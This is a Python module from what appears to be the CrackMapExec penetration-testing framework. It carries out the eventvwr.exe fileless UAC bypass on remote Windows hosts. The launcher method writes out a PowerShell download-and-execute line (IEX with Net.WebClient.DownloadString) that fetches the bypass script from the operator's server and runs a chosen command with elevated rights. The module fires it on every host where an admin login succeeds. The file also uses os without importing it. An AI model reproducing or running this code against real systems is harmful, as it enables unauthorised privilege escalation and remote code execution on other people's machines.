from cme.helpers import create_ps_command, get_ps_script
from sys import exit

class CMEModule:

    '''
        Executes a command using the the eventvwr.exe fileless UAC bypass
        Powershell script and vuln discovery by Matt Nelson (@enigma0x3)

        module by @byt3bl33d3r
    '''

    name = 'eventvwr_bypass'

    description = 'Executes a command using the eventvwr.exe fileless UAC bypass'

    chain_support = True

    def options(self, context, module_options):
        '''
            COMMAND  Command to execute on the target system(s) (Required if CMDFILE isn't specified)
            CMDFILE  File contaning the command to execute on the target system(s) (Required if CMD isn't specified)
        '''

        if not 'COMMAND' in module_options and not 'CMDFILE' in module_options:
            context.log.error('COMMAND or CMDFILE options are required!')
            exit(1)

        if 'COMMAND' in module_options and 'CMDFILE' in module_options:
            context.log.error('COMMAND and CMDFILE are mutually exclusive!')
            exit(1)

        if 'COMMAND' in module_options:
            self.command = module_options['COMMAND']

        elif 'CMDFILE' in module_options:
            path = os.path.expanduser(module_options['CMDFILE'])

            if not os.path.exists(path):
                context.log.error('Path to CMDFILE invalid!')
                exit(1)

            with open(path, 'r') as cmdfile:
                self.command = cmdfile.read().strip()

    def launcher(self, context, command):
        launcher = '''
        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-EventVwrBypass.ps1');
        Invoke-EventVwrBypass -Force -Command "{command}";
        '''.format(server=context.server,
                   addr=context.localip,
                   port=context.server_port,
                   command=command)

        return create_ps_command(launcher)

    def payload(self, context, command):
        with open(get_ps_script('Invoke-EventVwrBypass.ps1'), 'r') as ps_script:
            return ps_script.read()

    def on_admin_login(self, context, connection, launcher, payload):
        connection.execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request, launcher, payload):
        if request.path[1:] == 'Invoke-EventVwrBypass.ps1':
            request.send_response(200)
            request.end_headers()

            request.wfile.write(payload)

            request.stop_tracking_host()

        else:
            request.send_response(404)
            request.end_headers()